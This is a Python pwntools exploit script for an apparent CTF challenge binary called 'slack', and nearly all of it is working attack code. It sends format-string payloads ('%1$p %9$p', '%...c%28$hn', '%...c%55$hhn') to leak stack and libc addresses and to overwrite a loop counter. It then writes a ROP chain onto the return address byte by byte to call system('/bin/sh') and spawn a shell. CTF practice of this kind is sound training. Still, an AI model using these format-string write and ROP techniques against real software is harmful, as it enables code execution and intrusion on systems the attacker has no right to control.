import pwn
import time
import warnings

warnings.filterwarnings(action='ignore', category=BytesWarning)

elf = pwn.ELF("./slack")
pwn.context.binary = elf
# pwn.context.log_level = "DEBUG"
pwn.context(terminal=['tmux', 'split-window', '-h'])

libc = elf.libc
# p = pwn.remote("challs.actf.co", "31500")
p = pwn.process("./slack_patched")

# for i in range(1, 19):
#     p = pwn.process("./slack")
#     # p.sendlineafter(b"): ", f"%{i}$p")
#     p.sendlineafter("):", f"%{i}$p")
#     # p.sendlineafter(b"): ", f"%{i}$p")

#     p.recvuntil("You: ")

#     data = p.recvline().strip()
#     print(f"{i=} {data=}")
#     p.close()


# p = elf.process()

# Step 1: Leak Stack/libc
p.sendlineafter(b"): ", "%1$p %9$p")
p.recvuntil("You: ")
data = p.recvline().strip()
stack_leak, libc_leak = data.split(b" ")
print(f"{stack_leak=} {libc_leak=}")

libc.address = int(libc_leak, 16) - (0x7F8FF5E916A0 - 0x7F8FF5C71000)
print(f"{hex(libc.address)=}")

ret_addr = int(stack_leak, 16) + (0x7FFD8F295498 - 0x7FFD8F293300)
print(f"{hex(ret_addr)=}")

i_addr = ret_addr - (14 * 8)
print(f"{hex(i_addr)=}")


# Step 2: Set i to some large negative number
print(i_addr + 3)
print((i_addr + 3) & 0xffff)
p.sendafter(b"): ", f"%{(i_addr+3) & 0xffff}c%28$hn")
p.sendlineafter("): ", "%255c%55$hn")


# Step 3: Overwrite return address with one_gadget

rop = pwn.ROP(libc)
rop.raw(rop.find_gadget(["ret"]))
rop.system(next(libc.search(b"/bin/sh")))
chain = rop.chain()

for i in range(len(rop.chain())):
    payload = chain[i]

    out = f"%{(ret_addr+i) & 0xffff}c%28$hn"
    print(f"{i=} {out=}")
    p.sendlineafter(b"): ", out)

    if payload == 0:
        out = f"%55$hhn"
        print(f"{i=} {out=}")
    else:
        out = f"%{payload}c%55$hhn"
        print(f"{i=} {out=}")
    p.sendlineafter("): ", out)

# pwn.gdb.attach(
#     p,
#     """b *(main+402)
# b *(main+452)
# """,
# )

# exit
p.sendafter(b"): ", f"%{(i_addr+3) & 0xffff}c%28$hn")
p.sendlineafter("): ", "%55$hn")

# p.interactive()
